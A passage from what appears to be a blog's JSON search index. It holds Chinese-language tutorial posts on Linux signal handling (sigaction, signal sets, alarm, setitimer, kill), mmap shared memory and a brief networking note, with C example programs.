if(pid==0) //子进程 &#123; printf(\"child: fpid==[%d], cpid==[%d]\\n\", getppid(), getpid()); break; &#125; &#125; //父进程 if(i==3) &#123; printf(\"[%d]:father: fpid==[%d]\\n\", i, getpid()); //signal(SIGCHLD, waitchild); //注册信号处理函数 struct sigaction act; act.sa_handler = waitchild; sigemptyset(&amp;act.sa_mask); act.sa_flags = 0; sleep(5); sigaction(SIGCHLD, &amp;act, NULL); //解除对SIGCHLD信号的阻塞 sigprocmask(SIG_UNBLOCK, &amp;mask, NULL); while(1) &#123; sleep(1); &#125; &#125; //第1个子进程 if(i==0) &#123; printf(\"[%d]:child: cpid==[%d]\\n\", i, getpid()); //sleep(1); &#125; //第2个子进程 if(i==1) &#123; printf(\"[%d]:child: cpid==[%d]\\n\", i, getpid()); sleep(1); &#125; //第3个子进程 if(i==2) &#123; printf(\"[%d]:child: cpid==[%d]\\n\", i, getpid()); sleep(1); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"sigaction函数","slug":"linux079sigaction","date":"2022-01-22T13:10:27.000Z","updated":"2022-01-23T08:35:04.927Z","comments":true,"path":"2022/01/22/linux079sigaction/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/22/linux079sigaction/","excerpt":"","text":"sigaction函数 函数说明：注册一个信号处理函数 函数原型： 1int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact); 函数参数： signum：捕捉的信号 act： 传入参数，新的处理方式。 oldact： 传出参数，旧的处理方式 12345678910111213struct sigaction &#123;void (*sa_handler)(int); // 信号处理函数void (*sa_sigaction)(int, siginfo_t *, void *); //信号处理函数sigset_t sa_mask; //信号处理函数执行期间需要阻塞的信号int sa_flags; //通常为0，表示使用默认标识void (*sa_restorer)(void);&#125;; 总结： sa_handler：指定信号捕捉后的处理函数名(即注册函数)。也可赋值为SIG_IGN表忽略 或 SIG_DFL表执行默认动作 sa_mask: 用来指定在信号处理函数执行期间需要被屏蔽的信号，特别是当某个信号被处理时，它自身会被自动放入进程的信号掩码，因此在信号处理函数执行期间这个信号不会再度发生。注意：仅在处理函数被调用期间屏蔽生效，是临时性设置。 sa_flags：通常设置为0，使用默认属性。 sa_restorer：已不再使用 练习：编写程序，使用sigaction函数注册信号捕捉函数，并使用这个程序验证信号是否支持排队。 12345678910111213141516171819202122232425262728293031323334//sigaction函数测试---注册信号处理函数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo); sleep(4);&#125;int main()&#123; //注册信号处理函数 struct sigaction act; act.sa_handler = sighandler; sigemptyset(&amp;act.sa_mask); //在信号处理函数执行期间, 不阻塞任何信号 sigaddset(&amp;act.sa_mask, SIGQUIT); act.sa_flags = 0; sigaction(SIGINT, &amp;act, NULL); signal(SIGQUIT, sighandler); while(1) &#123; sleep(10); &#125; return 0;&#125; 知识点: 信号处理不支持排队: 在XXX信号处理函数执行期间, XXX信号是被阻塞的, 如果该信号产生了多次, 在XXX信号处理函数结束之后, 该XXX信号只被处理一次. 在XXX信号处理函数执行期间,如果阻塞了YYY信号, 若YYY信号产生了多次, 当XXX信号处理函数结束后, YYY信号只会被处理一次. 内核实现信号捕捉的过程 如果信号的处理动作是用户自定义函数，在信号递达时就调用这个函数，这称为捕捉信号。由于信号处理函数的代码是在用户空间的，处理过程比较复杂，举例如下： 用户程序注册了SIGQUIT信号的处理函数sighandler。 当前正在执行main函数，这时发生中断或异常切换到内核态。 在中断处理完毕后要返回用户态的main函数之前检查到有信号SIGQUIT递达。 内核决定返回用户态后不是恢复main函数的上下文继续执行，而是执行sighandler函数，sighandler和main函数使用不同的堆栈空间，它们之间不存在调用和被调用的关系，是两个独立的控制流程。 sighandler函数返回后自动执行特殊的系统调用sigreturn再次进入内核态。 如果没有新的信号要递达，这次再返回用户态就是恢复main函数的上下文继续执行了。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"信号集相关函数","slug":"linux078信号集相关函数","date":"2022-01-22T06:35:35.000Z","updated":"2022-01-22T13:07:07.163Z","comments":true,"path":"2022/01/22/linux078信号集相关函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/22/linux078信号集相关函数/","excerpt":"","text":"由于信号集属于内核的一块区域，用户不能直接操作内核空间，为此，内核提供了一些信号集相关的接口函数，使用这些函数用户就可以完成对信号集的相关操作。 信号集是一个能表示多个信号的数据类型，sigset_t set，set即一个信号集。既然是一个集合，就需要对集进行添加、删除等操作。 12345678910111213sigset_t类型的定义在signal.h文件中的第49行处:typedef __sigset_t sigset_t;__sigset_t的定义在sigset.h文件中的26，27行处: # define _SIGSET_NWORDS (1024 / (8 * sizeof (unsigned long int))) typedef struct &#123; unsigned long int __val[_SIGSET_NWORDS]; &#125; __sigset_t; 上述变量类型的定义的查找有个小窍门： 可以执行gcc的预处理命令：gcc -E test.c -o test.i 这样头文件就会展开，可以直接到test.i文件中看到相关变量类型的定义。 信号集相关函数 int sigemptyset(sigset_t *set); 函数说明：将某个信号集清0 函数返回值：成功：0；失败：-1，设置errno int sigfillset(sigset_t *set); 函数说明：将某个信号集置1 函数返回值：成功：0；失败：-1，设置errno int sigaddset(sigset_t *set, int signum); 函数说明：将某个信号加入信号集合中 函数返回值：成功：0；失败：-1，设置errno int sigdelset(sigset_t *set, int signum); 函数说明：将某信号从信号清出信号集 函数返回值：成功：0；失败：-1，设置errno int sigismember(const sigset_t *set, int signum); 函数说明：判断某个信号是否在信号集中 函数返回值：在：1；不在：0；出错：-1，设置errno sigprocmask函数 函数说明：用来屏蔽信号、解除屏蔽也使用该函数。其本质，读 取或修改进程控制块中的信号屏蔽字（阻塞信号集）。 特别注意，屏蔽信号只是将信号处理延后执行(延至解除屏蔽)；而忽略表示将信号丢弃处理。 函数原型：int sigprocmask(int how, const sigset_t *set, sigset_t *oldset); 函数返回值：成功：0；失败：-1，设置errno 函数参数： how参数取值：假设当前的信号屏蔽字为mask SIG_BLOCK: 当how设置为此值，set表示需要屏蔽的信号。相当于 mask = mask | set SIG_UNBLOCK: 当how设置为此，set表示需要解除屏蔽的信号。相当于 mask = mask &amp; ~set SIG_SETMASK: 当how设置为此，set表示用于替代原始屏蔽及的新屏蔽集。相当于mask = set若，调用sigprocmask解除了对当前若干个信号的阻塞，则在sigprocmask返回前，至少将其中一个信号递达。 set：传入参数，是一个自定义信号集合。由参数how来指示如何修改当前信号屏蔽字。 oldset：传出参数，保存旧的信号屏蔽字。 sigpending函数 函数原型：int sigpending(sigset_t *set); 函数说明：读取当前进程的未决信号集 函数参数：set传出参数 函数返回值：成功：0；失败：-1，设置errno 练习：编写程序，设置阻塞信号集并把所有常规信号的未决状态打印至屏幕。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273//信号集相关函数测试#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo);&#125;int main()&#123; //注册SIGINT和SIGQUIT的信号处理函数 signal(SIGINT, sighandler); signal(SIGQUIT, sighandler); //定义sigset_t类型的变量 sigset_t pending, mask, oldmask; //初始化 sigemptyset(&amp;pending); sigemptyset(&amp;mask); sigemptyset(&amp;oldmask); //将SIGINT和SIGQUIT加入到阻塞信号集中 sigaddset(&amp;mask, SIGINT); sigaddset(&amp;mask, SIGQUIT); //将mask中的SIGINT和SIGQUIT信号加入到阻塞信号集中 //sigprocmask(SIG_BLOCK, &amp;mask, NULL); sigprocmask(SIG_BLOCK, &amp;mask, &amp;oldmask); int i = 1; int k = 1; while(1) &#123; //获取未决信号集 sigpending(&amp;pending); for(i=1; i&lt;32; i++) &#123; //判断某个信号是否在集合中 if(sigismember(&amp;pending, i)==1) &#123; printf(\"1\"); &#125; else &#123; printf(\"0\"); &#125; &#125; printf(\"\\n\"); if(k++%10==0) &#123; //从阻塞信号集中解除对SIGINT和SIGQUIT的阻塞 //sigprocmask(SIG_UNBLOCK, &amp;mask, NULL); sigprocmask(SIG_SETMASK, &amp;oldmask, NULL); &#125; else &#123; sigprocmask(SIG_BLOCK, &amp;mask, NULL); &#125; sleep(1); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"未决信号集和阻塞信号集的关系","slug":"linux077未决信号集和阻塞信号集的关系","date":"2022-01-22T05:56:34.000Z","updated":"2022-01-22T07:37:44.866Z","comments":true,"path":"2022/01/22/linux077未决信号集和阻塞信号集的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/22/linux077未决信号集和阻塞信号集的关系/","excerpt":"","text":"未决信号集和阻塞信号集的关系 阻塞信号集是当前进程要阻塞的信号的集合，未决信号集是当前进程中还处于未决状态的信号的集合，这两个集合存储在内核的PCB中。 下面以SIGINT为例说明信号未决信号集和阻塞信号集的关系： 编号从1开始 当进程收到一个SIGINT信号（信号编号为2），首先这个信号会保存在未决信号集合中，此时对应的2号编号的这个位置上置为1，表示处于未决状态；在这个信号需要被处理之前首先要在阻塞信号集中的编号为2的位置上去检查该值是否为1： 如果为1，表示SIGNIT信号被当前进程阻塞了，这个信号暂时不被处理，所以未决信号集上该位置上的值保持为1，表示该信号处于未决状态； 如果为0，表示SIGINT信号没有被当前进程阻塞，这个信号需要被处理，内核会对SIGINT信号进行处理（执行默认动作，忽略或者执行用户自定义的信号处理函数），并将未决信号集中编号为2的位置上将1变为0，表示该信号已经处理了，这个时间非常短暂，用户感知不到。 当SIGINT信号从阻塞信号集中解除阻塞之后，该信号就会被处理。 未决信号集和阻塞信号集的数据类型都是sigset_t","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"setitimer函数","slug":"linux076setitimer函数","date":"2022-01-21T16:27:46.000Z","updated":"2022-01-22T05:19:25.228Z","comments":true,"path":"2022/01/22/linux076setitimer函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/22/linux076setitimer函数/","excerpt":"","text":"函数原型 1int setitimer(int which, const struct itimerval *new_value,struct itimerval *old_value); 函数描述 设置定时器(闹钟)，可代替alarm函数，精度微秒us，可以实现周期定时。 函数返回值 成功：0； 失败：-1，设置errno值 函数参数： which：指定定时方式 自然定时：ITIMER_REAL → 14）SIGALRM计算自然时间 虚拟空间计时(用户空间)：ITIMER_VIRTUAL→ 26）SIGVTALRM 只计算进程占用cpu的时间 运行时计时(用户+内核)：ITIMER_PROF → 27）SIGPROF计算占用cpu及执行系统调用的时间 new_value：struct itimerval, 负责设定timeout时间。 itimerval.it_value: 设定第一次执行function所延迟的秒数 itimerval.it_interval: 设定以后每几秒执行function old_value： 存放旧的timeout值，一般指定为NULL 123456789101112131415struct itimerval &#123; struct timerval it_interval; // 闹钟触发周期 struct timerval it_value; // 闹钟触发时间 &#125;; struct timeval &#123; long tv_sec; // 秒 long tv_usec; // 微秒 &#125; 练习: 使用setitimer实现每隔一秒打印一次hello, world。 1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/time.h&gt;#include&lt;signal.h&gt;void sighandler(int signo)&#123; printf(\"hello world\\n\"); printf(\"signo [%d]\\n\",signo);&#125;int main(int argc,char * argv[])&#123; //注册捕获SIGALRM信号处理函数 signal(SIGALRM,sighandler); struct itimerval tm; //周期性时间赋值 tm.it_interval.tv_sec = 1; tm.it_interval.tv_usec = 0; //第一次触发的时间,3秒后每隔1秒发送一次SIGALRM信号 tm.it_value.tv_sec = 3; tm.it_value.tv_usec = 0; setitimer(ITIMER_REAL,&amp;tm,NULL); while(1) &#123; sleep(1); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"alarm函数","slug":"linux075alarm函数","date":"2022-01-21T12:20:15.000Z","updated":"2022-01-21T12:34:18.185Z","comments":true,"path":"2022/01/21/linux075alarm函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/21/linux075alarm函数/","excerpt":"","text":"alarm函数 函数原型：unsigned int alarm(unsigned int seconds); 函数描述：设置定时器(闹钟)。在指定seconds后，内核会给当前进程发送14）SIGALRM信号。进程收到该信号，默认动作终止。每个进程都有且只有唯一的一个定时器。 函数返回值：返回0或剩余的秒数，无失败。例如： 常用操作：取消定时器alarm(0)，返回旧闹钟余下秒数。 alarm使用的是自然定时法，与进程状态无关，就绪、运行、挂起(阻塞、暂停)、终止、僵尸…无论进程处于何种状态，alarm都计时。 ============================================================================= 练习题1：编写一个程序测试alarm函数 练习题2：编写程序，测试你的电脑1秒种能数多个数字。 使用time命令查看程序执行的时间。程序运行的瓶颈在于IO，优化程序，首选优化IO。 实际执行时间 = 系统时间 + 用户时间 + 损耗时间 损耗的时间主要来来自文件IO操作，IO操作会有用户区到内核区的切换，切换的次数越多越耗时。 12345678910111213141516171819202122232425262728293031323334//signal函数测试---注册信号处理函数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo);&#125;int main()&#123; //注册信号处理函数 signal(SIGINT, sighandler); signal(SIGALRM, sighandler); int n = alarm(5); printf(\"first: n==[%d]\\n\", n); sleep(2); n = alarm(5); //n = alarm(0); //取消时钟 printf(\"second: n==[%d]\\n\", n); while(1) &#123; sleep(10); &#125; return 0;&#125; 12345678910111213141516171819//测试1秒钟可以数多少数字#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;int main()&#123; //一秒钟后发送信号 alarm(1); int i = 0; while(1) &#123; printf(\"[%d]\", i++); &#125; return 0;&#125; time命令 查看程序使用的时间 12345time 程序名real 实际执行时间user 用户时间sys 系统时间(内核时间) 实际执行时间 = 系统时间 + 用户时间 + 损耗时间 损耗时间= 实际执行时间-(系统时间 + 用户时间 ) 每一个数字都直接打印:printf(&quot;[%d]\\n&quot;, i++); 1234real 0m1.217suser 0m0.120ssys 0m0.252s15734次 损耗时间= 1.217-(0.120+0.252)=0.845 文件重定向之后: 12345time ./alarm_uncle &gt; test.logreal 0m1.003suser 0m0.520ssys 0m0.428s2191879次 损耗时间=1.003-(0.520+0.428)=0.055 原因是: 调用printf函数打印数字遇到\\n才会打印, 打印过程涉及到从 用户区到内核区的切换, 切换次数越多消耗的时间越长, 效率越低; 而使用文件重定向, 由于文件操作是带缓冲的, 所以涉及到用户区到内核区的 切换次数大大减少,从而使损耗降低.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"abort函数和raise函数","slug":"linux074abort函数和raise函数","date":"2022-01-20T12:16:22.000Z","updated":"2022-01-20T13:51:22.352Z","comments":true,"path":"2022/01/20/linux074abort函数和raise函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/20/linux074abort函数和raise函数/","excerpt":"","text":"raise函数 函说描述：给当前进程发送指定信号(自己给自己发) 函数原型： 1int raise(int sig); 函数返回值：成功：0，失败非0值 函数拓展: 1raise(signo) == kill(getpid(), signo); abort函数 函数描述：给自己发送异常终止信号 6) SIGABRT，并产生core文件 函数原型：void abort(void); 设置core文件大小 12345678910111213141516171819ulimit -c unlimited //无限制大小ulimit -x //x代表的是 下面带-的参数,比如-cyxc19980620c@yc:~/my/demo05$ ulimit -acore file size (blocks, -c) 0data seg size (kbytes, -d) unlimitedscheduling priority (-e) 0file size (blocks, -f) unlimitedpending signals (-i) 15434max locked memory (kbytes, -l) 65536max memory size (kbytes, -m) unlimitedopen files (-n) 1024pipe size (512 bytes, -p) 8POSIX message queues (bytes, -q) 819200real-time priority (-r) 0stack size (kbytes, -s) 8192cpu time (seconds, -t) unlimitedmax user processes (-u) 15434virtual memory (kbytes, -v) unlimitedfile locks (-x) unlimited 函数拓展： 1abort() == kill(getpid(), SIGABRT); 12345678910111213141516171819202122232425262728293031//raise和abort函数测-#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo);&#125;int main()&#123; //注册信号处理函数 signal(SIGINT, sighandler); //给当前进程发送SIGINT信号 raise(SIGINT); //给当前进程发送SIGABRT abort(); while(1) &#123; sleep(10); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"信号相关函数","slug":"linux073信号相关函数","date":"2022-01-20T10:38:02.000Z","updated":"2022-01-20T10:45:23.684Z","comments":true,"path":"2022/01/20/linux073信号相关函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/20/linux073信号相关函数/","excerpt":"","text":"signal函数 函数作用：注册信号捕捉函数 函数原型 123typedef void (*sighandler_t)(int);sighandler_t signal(int signum, sighandler_t handler); 函数参数 signum：信号编号 handler：信号处理函数 12345678910111213141516171819202122232425//signal函数测试---注册信号处理函数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo);&#125;int main()&#123; //注册信号处理函数 signal(SIGINT, sighandler); //while(1) &#123; sleep(10); &#125; return 0;&#125; kill函数/命令 描述：给指定进程发送指定信号 kill命令：kill -SIGKILL 进程PID kill函数原型： 1int kill(pid_t pid, int sig); 函数返回值： 成功：0； 失败：-1，设置errno 函数参数： sig信号参数：不推荐直接使用数字，应使用宏名，因为不同操作系统信号编号可能不同，但名称一致。 pid参数： pid &gt; 0: 发送信号给指定的进程。 pid = 0: 发送信号给与调用kill函数进程属于同一进程组的所有进程。 pid &lt; -1: 取|pid|发给对应进程组。 pid = -1：发送给进程有权限发送的系统中所有进程。 进程组：每个进程都属于一个进程组，进程组是一个或多个进程集合，他们相互关联，共同完成一个实体任务，每个进程组都有一个进程组长，默认进程组ID与进程组长ID相同。 123456789101112131415161718192021222324252627//signal函数测试---注册信号处理函数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;//信号处理函数void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\", signo);&#125;int main()&#123; //注册信号处理函数 signal(SIGINT, sighandler); while(1) &#123; sleep(1); kill(getpid(), SIGINT); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"信号的基本概念","slug":"linux072信号的基本概念","date":"2022-01-20T08:51:19.000Z","updated":"2022-01-22T16:21:43.015Z","comments":true,"path":"2022/01/20/linux072信号的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/20/linux072信号的基本概念/","excerpt":"","text":"信号介绍 信号的概念 信号是信息的载体，Linux/UNIX 环境下，古老、经典的通信方式， 现下依然是主要的通信手段。 信号在我们的生活中随处可见，例如： 古代战争中摔杯为号； 现代战争中的信号弹; 体育比赛中使用的信号枪… 信号的特点 简单 不能携带大量信息 满足某个特点条件才会产生 2 信号的机制 进程A给进程B发送信号，进程B收到信号之前执行自己的代码，收到信号后，不管执行到程序的什么位置，都要暂停运行，去处理信号，处理完毕后再继续执行。与硬件中断类似——异步模式。但信号是软件层面上实现的中断，早期常被称为“软中断”。 每个进程收到的所有信号，都是由内核负责发送的。 进程A给进程B发送信号示意图： 2.1信号的状态 信号有三种状态：产生、未决和递达。 信号的产生 按键产生，如：Ctrl+c(终止进程SIGINT)、Ctrl+z(挂起进程SIGTSTP)、Ctrl+\\(退出进程SIGQUIT) 系统调用产生，如：kill、raise、abort 软件条件产生，如：定时器alarm 硬件异常产生，如：非法访问内存(段错误)、除0(浮点数例外)、内存对齐出错(总线错误) 命令产生，如：kill命令 未决：产生和递达之间的状态。主要由于阻塞(屏蔽)导致该状态。 递达：递送并且到达进程。 2.2 信号的处理方式 执行默认动作 忽略信号(丢弃不处理) 捕捉信号(调用用户的自定义的处理函数) 2.3 信号的特质 信号的实现手段导致信号有很强的延时性，但对于用户来说，时间非常短，不易察觉。 Linux内核的进程控制块PCB是一个结构体，task_struct, 除了包含进程id，状态，工作目录，用户id，组id，文件描述符表，还包含了信号相关的信息，主要指阻塞信号集和未决信号集。 注:表示PCB的task_struct结构体定义在： 1/usr/src/linux-headers-4.4.0-97/include/linux/sched.h:1390 2.4 阻塞信号集和未决信号集 Linux内核的进程控制块PCB是一个结构体，这个结构体里面包含了信号相关的信息，主要有阻塞信号集和未决信号集。 阻塞信号集中保存的都是被当前进程阻塞的信号。若当前进程收到的是阻塞信号集中的某些信号，这些信号需要暂时被阻塞，不予处理。 信号产生后由于某些原因(主要是阻塞)不能抵达，这类信号的集合称之为未决信号集。在屏蔽解除前，信号一直处于未决状态；若是信号从阻塞信号集中解除阻塞，则该信号会被处理，并从未决信号集中去除。 2.5信号的四要素 通过man 7 signal可以查看信号相关信息 信号编号 信号的名字 信号的默认处理(默认终止进程) 信号如何产生 1 信号的编号 使用kill -l命令可以查看当前系统有哪些信号，不存在编号为0的信号。其中1-31号信号称之为常规信号（也叫普通信号或标准信号），34-64称之为实时信号，驱动编程与硬件相关。 2 信号的名称 3 产生信号的事件 4信号的默认处理动作 Term：终止进程 Ign：忽略信号 (默认即时对该种信号忽略操作) Core：终止进程，生成Core文件。(查验死亡原因，用于gdb调试) Stop：停止（暂停）进程 Cont：继续运行进程 特别需要注意的是：The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.(无法捕获、阻止或忽略信号SIGKILL和SIGSTOP。) 几个常用到的信号 123456789101112131415161718192021222324252627282930313233343536373839404142SIGINT、SIGQUIT、SIGKILL、SIGSEGV、SIGUSR1、SIGUSR2、SIGPIPE、SIGALRM、SIGTERM、SIGCHLD、SIGSTOP、SIGCONTSIGHUP 1 A 在控制终端上是挂起信号, 或者控制进程结束SIGINT 2 A 从键盘输入的中断SIGQUIT 3 C 从键盘输入的退出SIGILL 4 C 无效硬件指令SIGABRT 6 C 非正常终止, 可能来自 abort(3)SIGFPE 8 C 浮点运算例外SIGKILL 9 AEF 杀死进程信号SIGSEGV 11 C 无效的内存引用SIGPIPE 13 A 管道中止: 写入已经关闭读取的管道SIGALRM 14 A 来自 alarm(2) 的超时信号SIGTERM 15 A 终止信号SIGUSR1 30,10,16 A 用户定义的信号 1SIGUSR2 31,12,17 A 用户定义的信号 2SIGCHLD 20,17,18 B 子进程结束或停止SIGCONT 19,18,25 继续停止的进程SIGSTOP 17,19,23 DEF 停止进程SIGTSTP 18,20,24 D 终端上发出的停止信号SIGTERM 15 A 终止信号SIGUSR1 30,10,16 A 用户定义的信号 1SIGUSR2 31,12,17 A 用户定义的信号 2SIGCHLD 20,17,18 B 子进程结束或停止SIGFPE 8 C 浮点运算例外SIGABRT 6 C 非正常终止, 可能来自 abort(3)SIGQUIT 3 C 从键盘输入的退出SIGILL 4 C 无效硬件指令SIGABRT 6 C 非正常终止, 可能来自 abort(3)SIGFPE 8 C 浮点运算例外SIGKILL 9 AEF 杀死进程信号SIGSEGV 11 C 无效的内存引用SIGPIPE 13 A 管道中止: 写入无人读取的管道SIGALRM 14 A 来自 alarm(2) 的超时信号SIGTERM 15 A 终止信号SIGUSR1 30,10,16 A 用户定义的信号 1SIGUSR2 31,12,17 A 用户定义的信号 2SIGCHLD 20,17,18 B 子进程结束或停止SIGCONT 19,18,25 继续停止的进程SIGSTOP 17,19,23 DEF 停止进程SIGTSTP 18,20,24 D 终端上发出的停止信号SIGTTIN 21,21,26 D 后台进程试图从控制终端(tty)输入SIGTTOU 22,22,27 D 后台进程试图在控制终端(tty)输出","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"第二章物理层","slug":"第二章物理层","date":"2022-01-19T17:14:47.000Z","updated":"2022-01-23T18:36:47.852Z","comments":true,"path":"2022/01/20/第二章物理层/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/20/第二章物理层/","excerpt":"","text":"物理层定义的标准 1.物理层解决如何在连接各种计算机的传输媒体上传输数据比特流 （0101…）。 物理层的主要任务：确定传输媒体的接口的一些特性： 1）机械特性：接口形状，大小，引线数目。 2）电气特性：规定电压范围（-5V到5V）。 3）功能特性：例如规定-5V是0，+5V是1. 4)过程特性：（规程特性）规定建立连接时各个相关部件的工作步骤(比如一个大可乐瓶和一个小可乐瓶,他们的瓶盖都是通用的,说明接口一样大小)。 数据通信基础知识","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"内存映射区","slug":"linux071内存映射区","date":"2022-01-19T11:37:10.000Z","updated":"2022-01-19T16:36:41.619Z","comments":true,"path":"2022/01/19/linux071内存映射区/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/19/linux071内存映射区/","excerpt":"","text":"存储映射区介绍 ​ 存储映射I/O (Memory-mapped I/O)使一个磁盘文件与存储空间中的一个缓冲区相映射。从缓冲区中取数据，就相当于读文件中的相应字节；将数据写入缓冲区，则会将数据写入文件。这样，就可在不使用read和write函数的情况下，使用地址（指针）完成I/O操作。 使用存储映射这种方法，首先应通知内核，将一个指定文件映射到存储区域中。这个映射工作可以通过mmap函数来实现。 mmap函数 1#include &lt;sys/mman.h&gt; 函数作用: 建立存储映射区 函数原型 1void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); 函数返回值： 成功：返回创建的映射区首地址； 失败：MAP_FAILED宏 并设置errno 参数： addr: 指定映射的起始地址, 通常设为NULL, 由系统指定 length：映射到内存的文件长度 prot： 映射区的保护方式, 最常用的: 读：PROT_READ 写：PROT_WRITE 读写：PROT_READ | PROT_WRITE flags： 映射区的特性, 可以是 MAP_SHARED: 写入映射区的数据会写回文件, 且允许其他映射该文件的进程共享。 MAP_PRIVATE: 对映射区的写入操作会产生一个映射区的复制(copy-on-write), 对此区域所做的修改不会写回原文件。 fd：由open返回的文件描述符, 代表要映射的文件。 offset：以文件开始处的偏移量, 必须是4k的整数倍, 通常为0, 表示从文件头开始映射。 munmap函数 1#include &lt;sys/mman.h&gt; 函数作用: 释放由mmap函数建立的存储映射区 函数原型: 1int munmap(void *addr, size_t length); 返回值： 成功：返回0 失败：返回-1，设置errno值 函数参数: addr：调用mmap函数成功返回的映射区首地址 length：映射区大小（mmap函数的第二个参数） mmap注意事项 创建映射区的过程中，隐含着一次对映射文件的读操作，将文件内容读取到映射区 当MAP_SHARED时，要求：映射区的权限应 &lt;=文件打开的权限(出于对映射区的保护)。而MAP_PRIVATE则无所谓，因为mmap中的权限是对内存的限制。 映射区的释放与文件关闭无关，只要映射建立成功，文件可以立即关闭。 特别注意，当映射文件大小为0时，不能创建映射区。所以，用于映射的文件必须要有实际大小；mmap使用时常常会出现总线错误，通常是由于共享文件存储空间大小引起的。 munmap传入的地址一定是mmap的返回地址。坚决杜绝指针++操作。 文件偏移量必须为0或者4K的整数倍 mmap创建映射区出错概率非常高，一定要检查返回值，确保映射区建立成功再进行后续操作。 有关mmap函数的使用总结 第一个参数写成NULL 第二个参数要映射的文件大小 &gt; 0 第三个参数：PROT_READ 、PROT_WRITE 第四个参数：MAP_SHARED 或者 MAP_PRIVATE 第五个参数：打开的文件对应的文件描述符 第六个参数：4k的整数倍 mmap函数相关思考题 可以open的时候O_CREAT一个新文件来创建映射区吗? 答:不可以,因为刚刚创建出来的文件大小是0 如果open时O_RDONLY, mmap时PROT参数指定PROT_READ|PROT_WRITE会怎样？ 答:open的权限应该大于等于mmap mmap映射完成之后, 文件描述符关闭，对mmap映射有没有影响？ 答:没有影响 如果文件偏移量为1000会怎样？ 答:必须为4K的整倍数 对mem越界操作会怎样？ 答:出错 如果mem++，munmap可否成功？ 答:出错 mmap什么情况下会调用失败？ 答:指定错误参数或内存不足的时候 如果不检测mmap的返回值，会怎样？ 答:如果mmap返回的是-1,而又不检测,从而会使用错误的指针 mmap应用练习 练习1：使用mmap完成对文件的读写操作 练习:2：使用mmap完成父子进程间通信 图解说明 思路 调用mmap函数创建存储映射区，返回映射区首地址ptr 调用fork函数创建子进程，子进程也拥有了映射区首地址 父子进程可以通过映射区首地址指针ptr完成通信 调用munmap函数释放存储映射区 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//使用mmap函数完成父子进程间通信#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int main()&#123; //使用mmap函数建立共享映射区 //void *mmap(void *addr, size_t length, int prot, int flags, // int fd, off_t offset); int fd = open(\"./test.log\", O_RDWR); if(fd&lt;0) &#123; perror(\"open error\"); return -1; &#125; int len = lseek(fd, 0, SEEK_END); void * addr = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); //void * addr = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_PRIVATE, 